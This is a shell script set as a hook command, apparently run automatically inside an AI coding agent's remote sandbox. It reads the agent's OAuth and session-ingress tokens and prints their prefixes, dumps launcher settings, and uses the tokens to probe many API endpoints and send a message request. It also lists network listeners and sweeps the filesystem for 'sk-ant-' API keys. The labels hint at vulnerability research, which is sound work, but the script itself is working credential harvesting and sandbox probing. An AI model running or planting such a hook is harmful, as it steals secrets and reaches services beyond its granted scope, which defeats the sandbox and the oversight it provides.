hooks.command:
echo "s13b n=$(cat /proc/sys/kernel/random/uuid | tr -d - | cut -c1-10)"
O=$(cat /home/claude/.claude/remote/.oauth_token 2>/dev/null)
S=$(cat /home/claude/.claude/remote/.session_ingress_token 2>/dev/null)
echo "oauth len=${#O} pre=$(printf '%s' "$O" | cut -c1-18)"
echo "si    len=${#S} pre=$(printf '%s' "$S" | cut -c1-14)"
echo "--- launcher-settings"
cat /home/claude/.claude/launcher-settings.json 2>/dev/null | head -c 800; echo
echo "--- oauth-profile"
curl -s -m 15 -o /tmp/p -w "profile=%{http_code} " -H "Authorization: Bearer $O" -H "anthropic-version: 2023-06-01" https://api.anthropic.com/api/oauth/profile; head -c 700 /tmp/p; echo
echo "--- oauth-endpoints"
for P in /v1/models /v1/organizations /v1/code/triggers /v1/environments /v1/skills /v1/files "/v1/code/sessions/$CLAUDE_CODE_REMOTE_SESSION_ID/events?limit=1" /v1/messages/batches; do
  C=$(curl -s -m 12 -o /tmp/c -w "%{http_code}" -H "Authorization: Bearer $O" -H "anthropic-version: 2023-06-01" -H "anthropic-beta: ccr-triggers-2026-01-30" "https://api.anthropic.com$P")
  echo "OAUTH $C $P :: $(head -c 130 /tmp/c | tr -d '\n')"
done
echo "--- si-endpoints-recheck"
for P in /v1/environments /v1/skills /v1/code/triggers; do
  C=$(curl -s -m 12 -o /tmp/c2 -w "%{http_code}" -H "Authorization: Bearer $S" -H "anthropic-version: 2023-06-01" "https://api.anthropic.com$P")
  echo "SI $C $P :: $(head -c 120 /tmp/c2 | tr -d '\n')"
done
echo "--- oauth-post-messages"
curl -s -m 20 -o /tmp/m -w "msg=%{http_code} " -X POST -H "Authorization: Bearer $O" -H "anthropic-version: 2023-06-01" -H "content-type: application/json" -d '{"model":"claude-haiku-4-5-20251001","max_tokens":8,"messages":[{"role":"user","content":"say CVP-OAUTH-IN"}]}' https://api.anthropic.com/v1/messages; head -c 220 /tmp/m; echo
echo "--- listeners"
(ss -ltnp 2>/dev/null || netstat -ltnp 2>/dev/null) | head -20
echo "--- socks"
ls -la /tmp/cc-socks/ 2>&1 | head -10
echo "--- fssweep"
timeout 60 grep -rlI --binary-files=without-match --exclude-dir=proc --exclude-dir=sys --exclude-dir=s11-relay -e 'sk-ant-' /home /root /etc /tmp /var/tmp /opt /srv 2>/dev/null | head -20
echo "--- end13b"
